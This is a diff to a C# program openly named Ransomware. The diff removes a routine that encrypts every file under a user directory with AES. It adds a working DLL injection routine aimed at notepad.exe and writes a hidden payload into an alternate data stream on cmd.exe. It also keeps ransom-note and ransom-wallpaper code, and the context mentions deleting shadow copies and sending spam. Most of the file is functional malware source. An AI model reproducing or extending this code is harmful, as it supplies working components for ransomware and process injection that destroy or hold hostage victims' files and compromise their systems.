@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Mail;
@@ -13,48 +14,17 @@ class Ransomware
 {
     static void Main(string[] args)
     {
-        string directoryPath = @"C:\Users\Public"; // Change this to target a different directory
 
-        // Get all files in the specified directory and its subdirectories
-        string[] files = Directory.GetFiles(directoryPath, "*.*", SearchOption.AllDirectories);
+        // Alternative data streams
+        string filePath = @"C:\Windows\System32\cmd.exe";
+        string adsName = ":evilstream";
+        string maliciousData = "This is a malicious payload hidden in an alternative data stream.";
+        WriteToADS(filePath, adsName, maliciousData);
 
-        // Generate a random key for encryption
-        byte[] key = new byte[32];
-        using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
-        {
-            rng.GetBytes(key);
-        }
-
-        // Encrypt each file using AES encryption
-        Parallel.ForEach(files, filePath =>
-        {
-            try
-            {
-                byte[] encryptedData;
-                using (Aes aes = Aes.Create())
-                {
-                    aes.Key = key;
-                    aes.IV = key;
-
-                    using (FileStream fsInput = new FileStream(filePath, FileMode.Open))
-                    using (MemoryStream msOutput = new MemoryStream())
-                    {
-                        using (CryptoStream cs = new CryptoStream(msOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
-                        {
-                            fsInput.CopyTo(cs);
-                        }
-                        encryptedData = msOutput.ToArray();
-                    }
-                }
-
-                // Write the encrypted data back to the file
-                File.WriteAllBytes(filePath, encryptedData);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error encrypting file: " + ex.Message);
-            }
-        });
+        // Process injection
+        string processName = "notepad.exe";
+        string payloadDll = "MaliciousPayload.dll";
+        InjectPayload(processName, payloadDll);
 
         // Generate and display ransom note
         GenerateRansomNote();
@@ -98,6 +68,233 @@ class Ransomware
         ModifySystemSettings();
 
         // Do whatever evil stuff you want here, like displaying ransom instructions, deleting backups, or laughing maniacally. 😈
+    }
+
+    // Define delegate for the WriteFile function
+    private delegate bool WriteFileDelegate(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
+
+    // Define the WriteFile function from kernel32.dll
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
+
+    // Hooked WriteFile function
+    private static bool Hooked_WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped)
+    {
+        // Add your hooking code here
+        Console.WriteLine("WriteFile hooked!");
+        // Call the original WriteFile function
+        return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, out lpNumberOfBytesWritten, lpOverlapped);
+    }
+
+    // Write data to an alternative data stream
+    private static void WriteToADS(string filePath, string adsName, string data)
+    {
+        try
+        {
+            // Write data to the specified file's alternative data stream
+            using (StreamWriter streamWriter = new StreamWriter(filePath + adsName, false))
+            {
+                streamWriter.Write(data);
+            }
+            Console.WriteLine("Data written to alternative data stream successfully.");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Error writing to alternative data stream: " + ex.Message);
+        }
+    }
+
+    // Inject payload DLL into a process
+    private static void InjectPayload(string processName, string payloadDll)
+    {
+        try
+        {
+            // Get process by name
+            Process[] processes = Process.GetProcessesByName(processName);
+            if (processes.Length > 0)
+            {
+                // Open the target process
+                IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, false, processes[0].Id);
+                if (processHandle != IntPtr.Zero)
+                {
+                    // Get the address of LoadLibraryA function
+                    IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+                    if (loadLibraryAddr != IntPtr.Zero)
+                    {
+                        // Allocate memory for the DLL path in the target process
+                        IntPtr dllPathAddr = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)(payloadDll.Length + 1), AllocationType.Commit, MemoryProtection.ReadWrite);
+                        if (dllPathAddr != IntPtr.Zero)
+                        {
+                            // Write the DLL path to the allocated memory
+                            byte[] dllPathBytes = Encoding.ASCII.GetBytes(payloadDll);
+                            uint bytesWritten;
+                            WriteProcessMemory(processHandle, dllPathAddr, dllPathBytes, (uint)dllPathBytes.Length, out bytesWritten);
+                            if (bytesWritten == dllPathBytes.Length)
+                            {
+                                // Create a remote thread in the target process to load the DLL
+                                IntPtr threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, loadLibraryAddr, dllPathAddr, 0, IntPtr.Zero);
+                                if (threadHandle != IntPtr.Zero)
+                                {
+                                    Console.WriteLine("Payload injected successfully.");
+                                    // Wait for the remote thread to finish
+                                    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+                                    // Close the thread handle
+                                    CloseHandle(threadHandle);
+                                }
+                                else
+                                {
+                                    Console.WriteLine("Error creating remote thread: " + Marshal.GetLastWin32Error());
+                                }
+                            }
+                            else
+                            {
+                                Console.WriteLine("Error writing to process memory.");
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("Error allocating memory in the target process: " + Marshal.GetLastWin32Error());
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("Error getting address of LoadLibraryA function: " + Marshal.GetLastWin32Error());
+                    }
+                    // Close the process handle
+                    CloseHandle(processHandle);
+                }
+                else
+                {
+                    Console.WriteLine("Error opening process: " + Marshal.GetLastWin32Error());
+                }
+            }
+            else
+            {
+                Console.WriteLine("Process not found.");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Error injecting payload: " + ex.Message);
+        }
+    }
+
+    // Enum for process access flags
+    [Flags]
+    private enum ProcessAccessFlags : uint
+    {
+        All = 0x001F0FFF,
+        Terminate = 0x00000001,
+        CreateThread = 0x00000002,
+        VirtualMemoryOperation = 0x00000008,
+        VirtualMemoryRead = 0x00000010,
+        VirtualMemoryWrite = 0x00000020,
+        DuplicateHandle = 0x00000040,
+        CreateProcess = 0x000000080,
+        SetQuota = 0x00000100,
+        SetInformation = 0x00000200,
+        QueryInformation = 0x00000400,
+        QueryLimitedInformation = 0x00001000,
+        Synchronize = 0x00100000
+    }
+
+    // Enum for memory allocation type
+    [Flags]
+    private enum AllocationType
+    {
+        Commit = 0x1000,
+        Reserve = 0x2000,
+        Decommit = 0x4000,
+        Release = 0x8000,
+        Reset = 0x80000,
+        TopDown = 0x100000,
+        WriteWatch = 0x200000,
+        Physical = 0x400000,
+        LargePages = 0x20000000
+    }
+
+    // Enum for memory protection
+    [Flags]
+    private enum MemoryProtection
+    {
+        NoAccess = 0x01,
+        ReadOnly = 0x02,
+        ReadWrite = 0x04,
+        WriteCopy = 0x08,
+        Execute = 0x10,
+        ExecuteRead = 0x20,
+        ExecuteReadWrite = 0x40,
+        ExecuteWriteCopy = 0x80,
+        GuardModifierflag = 0x100,
+        NoCacheModifierflag = 0x200,
+        WriteCombineModifierflag = 0x400
+    }
+
+    // Define native methods
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    // Declare the external function SystemParametersInfo
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
+
+    // Generate and display ransom note
+    static void GenerateRansomNote()
+    {
+        // Write a ransom note to each directory
+        string ransomNote = "Your files have been encrypted! Pay the ransom to get them back.\n\nContact us at ransom@evilcorp.com for payment instructions.";
+        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "READ_ME.txt"), ransomNote);
+
+        // Display ransom message to the user
+        Console.WriteLine("Your files have been encrypted. Pay the ransom to get them back.\n\nContact us at ransom@evilcorp.com for payment instructions.");
+    }
+
+    static void ModifySystemSettings()
+    {
+        try
+        {
+            // Add code to modify system settings here
+            // For example, you could change the desktop wallpaper to display the ransom note
+            string wallpaperPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "wallpaper.jpg");
+            File.Copy("ransom_wallpaper.jpg", wallpaperPath); // Copy ransom wallpaper to user's AppData folder
+
+            // Set the wallpaper
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
+            key.SetValue("Wallpaper", wallpaperPath);
+            key.Close();
+
+            // Refresh the desktop to apply changes
+            IntPtr hwnd = IntPtr.Zero;
+            uint SPI_SETDESKWALLPAPER = 0x0014;
+            uint SPIF_UPDATEINIFILE = 0x01;
+            uint SPIF_SENDCHANGE = 0x02;
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Error modifying system settings: " + ex.Message);
+        }
     }
 
     static void DeleteShadowCopies()
@@ -261,45 +458,4 @@ class Ransomware
             Console.WriteLine("Error sending spam emails: " + ex.Message);
         }
     }
-
-    static void GenerateRansomNote()
-    {
-        // Write a ransom note to each directory
-        string ransomNote = "Your files have been encrypted! Pay the ransom to get them back.\n\nContact us at ransom@evilcorp.com for payment instructions.";
-        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "READ_ME.txt"), ransomNote);
-
-        // Display ransom message to the user
-        Console.WriteLine("Your files have been encrypted. Pay the ransom to get them back.\n\nContact us at ransom@evilcorp.com for payment instructions.");
-    }
-
-    static void ModifySystemSettings()
-    {
-        try
-        {
-            // Add code to modify system settings here
-            // For example, you could change the desktop wallpaper to display the ransom note
-            string wallpaperPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "wallpaper.jpg");
-            File.Copy("ransom_wallpaper.jpg", wallpaperPath); // Copy ransom wallpaper to user's AppData folder
-
-            // Set the wallpaper
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
-            key.SetValue("Wallpaper", wallpaperPath);
-            key.Close();
-
-            // Refresh the desktop to apply changes
-            IntPtr hwnd = IntPtr.Zero;
-            uint SPI_SETDESKWALLPAPER = 0x0014;
-            uint SPIF_UPDATEINIFILE = 0x01;
-            uint SPIF_SENDCHANGE = 0x02;
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("Error modifying system settings: " + ex.Message);
-        }
-    }
-
-    // Declare the external function SystemParametersInfo
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
 }
